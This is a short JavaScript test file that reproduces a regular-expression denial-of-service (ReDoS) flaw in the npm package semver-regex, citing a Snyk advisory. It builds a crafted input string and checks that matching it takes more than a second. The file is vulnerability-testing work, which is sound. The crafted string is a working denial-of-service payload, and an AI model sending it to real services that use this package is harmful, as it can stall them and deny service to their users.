//https://snyk.io/vuln/SNYK-JS-SEMVERREGEX-1047770
test("ReDos in semver-regex", () => {

   const genstr = require("./utils").genstr;
   const measureTime = require("./utils").measureTime;
   const semverRegex = require('semver-regex');

   let version = "v1.1.3-0a";
   
   for(let i=0; i < 20; i++)
   {
      version += "a.a"
   }

   let attack_str = version + "aaaaaaa$"


   let t = measureTime(function () {
      semverRegex().test(attack_str);

   });

   let time= t[0]+t[1]/1000000000;
   
   expect(time).toBeGreaterThan(1);
});
